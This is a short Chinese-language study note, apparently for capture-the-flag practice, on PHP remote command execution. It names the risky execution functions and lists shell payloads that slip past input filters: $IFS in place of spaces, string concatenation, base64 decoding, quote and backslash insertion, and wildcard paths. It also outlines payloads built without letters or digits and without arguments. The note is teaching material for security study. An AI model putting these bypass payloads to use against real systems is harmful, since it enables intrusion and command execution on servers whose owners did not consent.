Remote Code Execute RCE 远程代码执行

1.形成原因

应用有时需要调用一些执行系统命令的函数,代码中未对用户可控参数做过滤,当用户能控制这些函数中的参数时,就可以将恶意系统命令拼接到正常命令中,从而造成命令执行攻击

常见命令执行函数：

PHP：

system()，exec()，shell_exec()，passthru()，pcntl_exec()，popen()，proc_open()

3.绕过方式

3.1绕过空格

1.使用$IFS

cat${IFS}flag

cat${IFS}$9flag

cat$IFS$9flag

2.使用重定向符

cat<>flag

cat<flag

3.2绕过黑名单

1.字符串拼接

a=c;b=at;c=flag;$a$b $c

a=g;cat fla$a

2.编码绕过

`echo “base64编码后的命令” | base64 -d`

3.单引号，双引号

c””at flag

c””at fl””ag

c””at fl’’ag

4.反斜线

c\at fl\ag

5.使用通配符

/???/??t

根据路径匹配cat

3.4无数字字母rce

是指通过一段不含有数字或字母的payload达到任意代码或者任意命令执行的目的

核心思路：

将非字母、数字的字符经过各种变换,最后能构造出a-z中任意一个字符。然后拼接出一个函数名,再利用PHP允许可变函数的特点,能够动态执行函数

使用异或构造payload

使用取反构造payload

3.5无参数rce

通过一段可以使用函数，但是函数不能调用参数的payload达到任意代码或者任意命令执行的目的
